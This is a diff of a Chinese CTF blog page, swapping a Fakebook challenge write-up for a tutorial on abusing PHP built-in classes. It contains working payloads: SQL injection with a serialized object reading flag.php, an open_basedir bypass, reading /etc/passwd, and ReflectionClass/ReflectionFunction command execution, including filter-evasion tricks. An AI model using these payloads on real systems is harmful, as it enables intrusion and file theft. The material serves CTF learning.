+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$dir</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//echo($f-&gt;__toString().&#39;&lt;bar&gt;&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>DirectoryIterator与glob://协议在一起组合可以绕过<strong>open_basedir</strong></p>
+<h4 id="filesystemiterator-__tostring方法">
+<a class="header-anchor" href="#filesystemiterator-__tostring%e6%96%b9%e6%b3%95"></a>
+FilesystemIterator-__toString方法
+</h4><p>使用方式与<strong>DirectoryIterator</strong>基本相同，这里就不细讲了</p>
+<h4 id="globiterator-__tostring方法">
+<a class="header-anchor" href="#globiterator-__tostring%e6%96%b9%e6%b3%95"></a>
+GlobIterator-__toString方法
+</h4><p>无需加glob协议，因为这是自带的
+<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226175140543.png" alt="dwdw"></p>
+<h3 id="读取文件类">
+<a class="header-anchor" href="#%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%b1%bb"></a>
+读取文件类
+</h3><h4 id="splfileobject-__tostring">
+<a class="header-anchor" href="#splfileobject-__tostring"></a>
+SplFileObject-__tostring
+</h4><p>SplFileObject类为文件提供了一个面向对象接口</p>
+<p>支持伪协议</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/php%E5%8E%9F%E7%94%9F%E7%B1%BB/image-20220226181714890.png" alt="dwdw"></p>
+<p>平常读取只能读取一行，要全部读取需要对内容进行遍历</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SplFileObject</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$context</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">UserInfo</span> <span class="p">);</span>
-</span></span></code></pre></div><p>payload如下</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">no</span><span class="o">=-</span><span class="mi">1</span> <span class="n">union</span><span class="o">/**/</span><span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="s1">&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:4:&#34;lier&#34;;s:3:&#34;age&#34;;i:1;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;</span><span class="c1">#</span>
-</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250701135310613.png" alt="image-20250701135310540">
-查看源码
-<img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250701135347934.png" alt="image-20250701135347852"></p>
-<p>base64解码得到flag</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250701135501359.png" alt="image-20250701135501300"></p>
-</div>
+</span></span></code></pre></div><h3 id="命令执行类">
+<a class="header-anchor" href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e7%b1%bb"></a>
+命令执行类
+</h3><h4 id="reflectionclass">
+<a class="header-anchor" href="#reflectionclass"></a>
+ReflectionClass
+</h4><ul>
+<li>一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(str 类名)，可以用<code>echo new ReflectionClass('className')</code>打印类的信息。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//定义一个类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">fuc</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">methond</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="s1">&#39;Hello World!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//建立fuc类的反射类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$rc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="s1">&#39;fuc&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//通过反射类实例化fuc类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$fuc</span> <span class="o">=</span> <span class="nv">$rc</span><span class="o">-&gt;</span><span class="na">newInstance</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//执行类方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$fuc</span><span class="o">-&gt;</span><span class="na">method</span><span class="p">();</span>
+</span></span></code></pre></div><h5 id="rce-__construct">
+<a class="header-anchor" href="#rce-__construct"></a>
+rce-__construct
+</h5><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nx">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250708172318890.png" alt="image-20250708172318838"></p>
+<h5 id="读取类信息-__tostring">
+<a class="header-anchor" href="#%e8%af%bb%e5%8f%96%e7%b1%bb%e4%bf%a1%e6%81%af-__tostring"></a>
+读取类信息-__tostring
+</h5><p>ctfshow-web101</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-22 00:26:48
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;ctfshow.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//flag in class ctfshow;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$v1</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$v2</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$v3</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$v0</span><span class="o">=</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$v2</span><span class="s2">(&#39;ctfshow&#39;)</span><span class="si">$v3</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;
+</span></span></code></pre></div><h5 id="输出字符串-__tostring">
+<a class="header-anchor" href="#%e8%be%93%e5%87%ba%e5%ad%97%e7%ac%a6%e4%b8%b2-__tostring"></a>
+输出字符串-__tostring
+</h5><p>ctfshow-web109</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="cm">/* 
+</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*- 
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa 
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09 
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa 
+</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-29 22:02:34 
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><p>分析,就算<code>$v2()</code>后多一个括号也没有影响</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="nx">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)();</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250708171307749.png" alt="image-20250708171307690"></p>
+<p>payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;)
+</span></span><span class="line"><span class="cl">?v1=ReflectionClass&amp;v2=system(&#34;ls&#34;)
+</span></span></code></pre></div><h4 id="reflectionfunction">
+<a class="header-anchor" href="#reflectionfunction"></a>
+ReflectionFunction
+</h4><p>可调用函数</p>
+<h5 id="rce-invoke">
+<a class="header-anchor" href="#rce-invoke"></a>
+rce-invoke
+</h5><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$function</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionFunction</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$function</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>有其他姿势</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$function</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionFunction</span><span class="p">(</span><span class="s1">&#39;call_user_func&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$function</span><span class="o">-&gt;</span><span class="na">invokeArgs</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="o">.</span><span class="s1">&#39;y&#39;</span><span class="o">.</span><span class="s1">&#39;s&#39;</span><span class="o">.</span><span class="s1">&#39;tem&#39;</span><span class="p">,</span><span class="s1">&#39;whoami&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//array(%27s%27.%27y%27.%27s%27.%27tem%27,%27cat%20/f%27.%27lag%27)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></div>
     <footer class="article-footer"><div class="sponsor-wrapper">
   <div class="sponsor-button-wrapper">
     <div class="sponsor-icon rotate"></div>
@@ -421,11 +533,11 @@
   </div><div class="sponsor-tip">文章内容有收获?打赏一元</div><div class="sponsor-qr"><div class="sponsor-qr-image-wrapper">
           <img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250618163116936.jpg" alt="支付宝" width="200" />
           <p class="sponsor-qr-name">支付宝</p>
-        </div></div></div><div class="share-wrapper"><a href="https://twitter.com/intent/tweet?url=https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/&amp;text=%e7%bd%91%e9%bc%8e%e6%9d%af%202018%20Fakebook&amp;via=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="网鼎杯 2018 Fakebook">
+        </div></div></div><div class="share-wrapper"><a href="https://twitter.com/intent/tweet?url=https://www.lier.xin/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1/&amp;text=Php%e5%8e%9f%e7%94%9f%e7%b1%bb%e5%88%a9%e7%94%a8-1&amp;via=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="Php原生类利用-1">
       <div class="share-icon icon icon-twitter"></div>
-    </a><a href="https://connect.qq.com/widget/shareqq/index.html?url=https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/&amp;title=%e7%bd%91%e9%bc%8e%e6%9d%af%202018%20Fakebook&amp;desc=%e9%a1%b6&amp;source=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="网鼎杯 2018 Fakebook">
+    </a><a href="https://connect.qq.com/widget/shareqq/index.html?url=https://www.lier.xin/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1/&amp;title=Php%e5%8e%9f%e7%94%9f%e7%b1%bb%e5%88%a9%e7%94%a8-1&amp;desc=php%e5%8e%9f%e7%94%9f%e7%b1%bb%e7%9a%84%e6%80%bb%e7%bb%93&amp;source=https://www.lier.xin/" target="_blank" rel="noopener noreferrer" title="Php原生类利用-1">
       <div class="share-icon icon icon-qq"></div>
-    </a><a href="javascript:;"  title="网鼎杯 2018 Fakebook">
+    </a><a href="javascript:;"  title="Php原生类利用-1">
       <div class="share-icon icon icon-weixin"><div id="share-weixin">
             <div class="share-weixin-dom">
               <div class="share-weixin-content">
@@ -446,16 +558,9 @@
     </a></div><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
       <a
         class="article-tag-list-link"
-        href="/tags/buuctf"
+        href="/tags/php%e5%8e%9f%e7%94%9f%e7%b1%bb"
         rel="tag"
-        >BUUCTF</a
-      >
-    </li><li class="article-tag-list-item" data-aos="zoom-in">
-      <a
-        class="article-tag-list-link"
-        href="/tags/%e7%bd%91%e9%bc%8e%e6%9d%af"
-        rel="tag"
-        >网鼎杯</a
+        >PHP原生类</a
       >
     </li></ul>
 </footer>
@@ -463,21 +568,13 @@
     id="article-nav"
     data-aos="fade-up"
   ><div class="article-nav-link-wrap article-nav-link-left"><img
-            data-src="/images/18.png"
+            data-src="/images/19.png"
             data-sizes="auto"
-            alt="Preg_replace E Rce"
+            alt="Serialize_01"
             class="lazyload"
-          /><a href="/post/preg_replace-e-rce/"></a>
+          /><a href="/post/serialize_01/"></a>
         <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">Preg_replace E Rce</h3>
-      </div><div class="article-nav-link-wrap article-nav-link-right"><img
-            data-src="/images/buu.png"
-            data-sizes="auto"
-            alt="CISCN2019 华北赛区 Day2 Web1Hack_World"
-            class="lazyload"
-          /><a href="/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/"></a>
-        <div class="article-nav-caption">后一篇</div>
-        <h3 class="article-nav-title">CISCN2019 华北赛区 Day2 Web1Hack_World</h3>
+        <h3 class="article-nav-title">Serialize_01</h3>
       </div></nav></article><section id="comments" data-aos="fade-up">
 <div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
   <div class="comment-selector">
@@ -530,12 +627,18 @@
   <div class="sidebar-toc-wrapper toc-div-class">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#思路">思路</a>
+    <li><a href="#php原生类-1">php原生类-1</a>
       <ul>
-        <li><a href="#题目源码">题目源码</a></li>
-        <li><a href="#关键代码分析">关键代码分析</a></li>
-        <li><a href="#解法一">解法一</a></li>
-        <li><a href="#解法二">解法二</a></li>
+        <li><a href="#php内置的类中存在可利用的魔术方法">php内置的类中存在可利用的魔术方法</a></li>
+      </ul>
+    </li>
+    <li><a href="#php原生类的直接利用">php原生类的直接利用</a>
+      <ul>
+        <li><a href="#ctfphp">ctf.php</a></li>
+        <li><a href="#报错类">报错类</a></li>
+        <li><a href="#遍历目录类">遍历目录类</a></li>
+        <li><a href="#读取文件类">读取文件类</a></li>
+        <li><a href="#命令执行类">命令执行类</a></li>
       </ul>
     </li>
   </ul>
@@ -682,10 +785,10 @@
   <div><script data-pjax>
         window.REIMU_POST = {
           author: "Lier",
-          title: "网鼎杯 2018 Fakebook",
-          url: "https:\/\/www.lier.xin\/post\/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook\/",
-          description: "顶",
-          cover: "https:\/\/www.lier.xin\/images\/buu.png",
+          title: "Php原生类利用-1",
+          url: "https:\/\/www.lier.xin\/post\/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1\/",
+          description: "php原生类的总结",
+          cover: "https:\/\/www.lier.xin\/images\/17.png",
         };
       </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
           if (_$$('.article-entry a.article-gallery-item').length > 0) {
@@ -818,7 +921,7 @@
             envId: '',
             region: '',
             urls: [
-              'https\/\/www.lier.xin\/post\/%e7%bd%91%e9%bc%8e%e6%9d%af-2018-fakebook\/'
+              'https\/\/www.lier.xin\/post\/php%e5%8e%9f%e7%94%9f%e7%b1%bb%e5%88%a9%e7%94%a8-1\/'
             ],
             includeReply: false
           }).then((res) => {
